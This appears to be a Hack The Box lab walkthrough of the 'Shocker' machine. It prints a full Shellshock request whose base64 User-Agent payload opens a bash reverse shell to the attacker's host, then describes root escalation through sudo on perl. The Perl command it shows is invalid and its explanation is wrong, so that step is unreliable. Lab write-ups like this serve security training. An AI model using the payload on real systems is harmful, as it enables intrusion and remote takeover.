# Shocker
>Author : Xyan1d3
>Date : 22nd June 2021
>IP : 10.10.10.56
>OS : Linux
>Difficulty : Easy

# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Tue Jun 22 23:07:00 2021 as: nmap -sC -sV -v -oN nmap/shocker 10.10.10.56
Nmap scan report for shocker.htb (10.10.10.56)
Host is up (0.075s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We could now, look up for the banner on `launchpad.net` to find out the OS Version.
Source : https://launchpad.net/ubuntu/+source/openssh/1:7.2p2-4ubuntu2.2

![[Pasted image 20210622232213.png]]

The OS Version here is Ubuntu Xenial `16.04`.

We have a weird thing in the box as the default SSH port is `22/tcp` but here SSH is running on port `2222/tcp`.

## Web Enumeration
The website has a picture of a bug.
The site does not has a `robots.txt`.
### Gobuster
```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/shocker]
└──╼ # gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --add-slash -o gobuster.out
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2021/06/23 00:31:41 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]
/icons/               (Status: 403) [Size: 292]
```

On doing a directory busting with gobuster we find out that we have a `/cgi-bin/` web directory.

The `cgi-bin` bin directory is most popular as for the famous shellshock vulnerability.
We could now do another `gobuster` run and try to find out any possible `cgi` or `sh` scripts inside this directory.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.3]─[~/htb/shocker]
└──╼ # gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x sh,cgi -t 25
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,cgi
[+] Timeout:                 10s
===============================================================
2021/06/23 00:34:31 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]
```

We find out that we have a bash script named `user.sh` inside this directory.
We could now, try to do a shellshock on this file.

We find out that the `user.sh` is a script which print's runs the `uptime` command and displays it on the website.
![[Pasted image 20210623004751.png]]

We now, try to inject the Shellshock payload into the `User-Agent` header.
![[Pasted image 20210623004906.png]]

And, We successfully get the output of the `id` command returned to us.

# Initial FootHold as shelly
We exploit the `ShellShock` vulnerability and put a bash reverse shell to get a shell into the box as the user `shelly`.
![[Pasted image 20210623005136.png]]
```python
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :;}; /bin/bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMQ== |base64 -d|bash'&
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
```
We recieve the a reverse shell as the user `shelly`.
![[Pasted image 20210623005247.png]]

BTW, I was using my own written https://github.com/Xyan1d3/shelter for this which is written by me :P

We could now, visit the home directory of the user `shelly` and get our user flag.
![[Pasted image 20210623005545.png]]

# Root Escalation
We do a simple `sudo -l` and find out that our user has sudo nopasswd on `perl`.
```python
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

`perl` is a programming language that means it also has `os` module and can execute commands on the system, We know where this is going.

```python
shelly@Shocker:/home/shelly$ sudo perl -e 'os.exec('bash')'
root@Shocker:/home/shelly# id
uid=0(root) gid=0(root) groups=0(root)
```
![[Pasted image 20210623010041.png]]